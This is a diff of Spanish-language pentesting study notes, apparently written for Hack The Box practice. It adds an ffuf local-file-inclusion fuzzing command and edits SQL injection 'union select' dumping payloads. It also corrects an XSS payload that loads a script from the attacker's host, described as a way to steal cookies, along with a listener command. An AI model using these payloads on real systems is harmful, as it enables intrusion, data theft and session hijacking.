@@ -317,6 +317,16 @@ Veamos algunas formas de bypassing, es decir, de eludir estas defensas:
 
 + `WHITE LIST + técnicas anteriores`  -puede que el código te oblige a poner una ruta, es decir una white list, entonces la añades y desde ahí pruebas.
 
+### Manera Automática
+
+Podríamos hacerlo de manera automática con alguna herramienta o mediante ffuz y un diccionario de rutas típicas para LFI. Os dejo un comando para esto último, lo saqué de la academia de Hack the box:
+```
+> ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://SERVER_IP:PUERTO/index.php?param=FUZZ' -fs SIZE_OCULTAR -o ARCHIVO
+```
+Las opciones son;  
+ -w: diccionario  
+-u: url  
+-fs: file size. Oculta el tamaño de la página, el size, que corresponde al número de caraceres.
 
 ### **Notas**:
 
@@ -587,9 +597,13 @@ Normalmente ,y como mejor, usar un script en python para ello. Ejemplo de script
 Esto; `select count(schema_name) from information_schema.schemata)=’NUMERO`   
 Irá bien para luego en el script poner hasta que número de base da datos sacar.
 
-Si no funciona nada de esto tiro ya de sqlmap -el tipo out-of-band no lo pruebo, para mas info de este ataque; https://www.youtube.com/watch?v=C-FiImhUviM&t=10178s -al final del video-. Y si tampoco saco nada entiendo que no es vulnerable, al menos para mí, y pruebo otras vías de ataque que no sean SQLi.
+Si no funciona nada de esto tiro ya de sqlmap -el tipo out-of-band no lo pruebo, para mas info de este ataque; https://www.youtube.com/watch?v=C-FiImhUviM&t=10178s -al final del video-. Podría probar también un **SQL Truncation Attack**.
 
-**¡¡Es vulnerable y puedo ver la salida de mis peticiones!!**. Empiezo entonces a **dumpear la data**:
+Y si no hay suerte entiendo que no es vulnerable, al menos para mí, y pruebo otras vías de ataque que no sean SQLi.
+
+### **A dumpear** ###
+
+**¿Qué es vulnerable y puedo ver la salida de mis peticiones?**. Empiezo entonces a dumpear la data:
 
 `admin’ union select 1,@@version,3-- -` Lo primero es saber la base de datos que hay detrás. Aunque sea mysql puede valer con `version()` en vez del @@version.
 
@@ -792,7 +806,7 @@ Estos scripts se introducen en los inputs de usuario candidatos a ser leídos.
 `<script>alert(“XSS”)</script>`  
 Nos saldrá ventana emergente con la alerta de XSS si es vulnerable.
 
-`<script src=”http://miIp/recurso.js></script>`  
+`<script src=”http://miIp/recurso.js"></script>`  
 Anterior comando podríamos usarlo solo para validar XSS o ya directamente para intentar robar la cookie. En mi máquina nos ponemos en escucha: 
 ```
 > python3 -m http.server 80  
